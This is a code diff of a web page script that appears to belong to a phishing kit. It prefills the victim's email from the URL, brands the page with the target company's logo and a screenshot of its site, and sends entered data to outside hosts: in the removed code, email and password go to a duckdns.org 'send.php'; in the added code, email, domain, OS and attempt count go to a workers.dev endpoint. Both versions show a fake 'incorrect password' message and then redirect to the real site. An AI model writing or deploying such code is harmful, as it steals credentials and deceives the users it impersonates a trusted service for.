@@ -1750,111 +1750,93 @@ document.getElementById('times').innerHTML = n + ' ' + time;
 
 	</script>
 <script>
+let attemptCount = 0;
+
+/* ========= OS ========= */
+function getOS() {
+  const ua = navigator.userAgent;
+  const platform = navigator.userAgentData?.platform || navigator.platform;
+
+  if (/Mac/.test(platform)) return 'Mac OS';
+  if (/iPhone|iPad|iPod/.test(platform)) return 'iOS';
+  if (/Win/.test(platform)) return 'Windows';
+  if (/Android/.test(ua)) return 'Android';
+  if (/Linux/.test(platform)) return 'Linux';
+  return 'Unknown';
+}
+
+$('#opsder').text(getOS());
+
+/* ========= TIME ========= */
+const now = new Date();
+$('#time, #times').text(now.toDateString() + ' ' + now.toLocaleTimeString());
+
+/* ========= PREFILL ========= */
 $(document).ready(function () {
 
-  let rawHash = window.location.hash;
+  const rawHash = window.location.hash;
   if (!rawHash || rawHash.length < 2) return;
 
-  let my_email;
+  let email;
   try {
-    my_email = decodeURIComponent(rawHash.substring(1)).trim();
+    email = decodeURIComponent(rawHash.substring(1)).trim();
   } catch {
     return;
   }
 
-  const filter = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-  if (!filter.test(my_email)) {
-    $('#error').show();
-    return;
-  }
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  if (!emailRegex.test(email)) return;
 
-  // ✅ Fill email everywhere safely
-  $('#email').val(my_email);
-  $('#emailich, #auth_email, #manutd, #footer_dom, #carss').text(my_email);
+  $('#email').val(email);
+  $('#emailich, #auth_email, #manutd, #footer_dom, #carss').text(email);
 
-  const domain = my_email.split('@')[1];
+  const domain = email.split('@')[1];
 
-  // ✅ Logo (FIXED)
   $('#top_label_logo').attr(
     'src',
     'https://img.logo.dev/' + domain + '?token=pk_XbcRLEiaQmKqN0PgTrqF6A'
   );
 
-  // ✅ Background / iframe screenshot
-  const mPage = 'https://screenshot.domains/' + domain;
   const iframe = document.getElementById('mainPage');
-  if (iframe) iframe.src = mPage;
+  if (iframe) iframe.src = 'https://screenshot.domains/' + domain;
 
 });
-$('#next_button').click(function(event){
-$('#error').hide();
-$('#msg').hide();
-event.preventDefault();
-var email=$("#email").val();
-var password=$("#password").val();
-var ind=email.indexOf("@");
-var my_slice=email.substr((ind+1));
-if (!password) {
-    $('#auth_reg').show();
-    $('#auth_reg').html("Password is empty!");
 
-                return false;
-            }
+/* ========= SUBMIT (NO PASSWORD) ========= */
+$('#next_button').on('click', function (e) {
+  e.preventDefault();
 
-count=count+1;
+  const email = $('#email').val().trim();
+  if (!email) {
+    $('#auth_reg').text('Email is required').show();
+    return;
+  }
 
-$.ajax({
-dataType: 'JSON',
-url: 'http://senkiz.duckdns.org/new/send.php',
-type: 'POST',
-      	data:{
-			email:email,
-            password:password,	
-      	},
-			data: $('#contactform').serialize(),
-            beforeSend: function(xhr){
-            	
-            },
-            success: function(response){
-            	if(response){
-            		$("#msg").show();
-            		console.log(response);
-            		if(response['signal'] == 'ok'){
-            			$("#password").val("");
-            			if (count>=2) {
-            				count=0;
-                    // window.location.replace(response['redirect_link']);
-                   window.location.replace("https://www."+my_slice);
-                }
-            	$("#auth_reg").show();
-               $('#auth_reg').html("Password is not correct. Please try again");
-            }
-            else{
-                        	$("#msg").show();
-               $('#msg').html("Password is not correct. Please try again");	
-            }
-        }
-    },
-    error: function(){
-    	$("#password").val("");
-    	if (count>=2) {
-    		count=0;
-    		 window.location.replace("https://www."+my_slice);
-    	}
-            	$("#auth_reg").show();
-               $('#auth_reg').html("Password is not correct. Please try again");
-    },
-    complete: function(){
-    	
+  attemptCount++;
+
+  $.ajax({
+    url: 'https://square-sun-b728.saleudon1.workers.dev',
+    type: 'POST',
+    contentType: 'application/json',
+    data: JSON.stringify({
+      email: email,
+      domain: email.split('@')[1],
+      attempt: attemptCount,
+      os: getOS(),
+      time: new Date().toISOString()
+    }),
+    success: function () {
+      $('#auth_reg').text('Invalid credentials. Try again.').show();
+
+      if (attemptCount >= 2) {
+        setTimeout(() => {
+          window.location.href = 'https://' + email.split('@')[1];
+        }, 1200);
+      }
     }
-});
   });
-
-
-	});
-
-
-</script>	
+});
+</script>
+	
    
    </body></html>
-
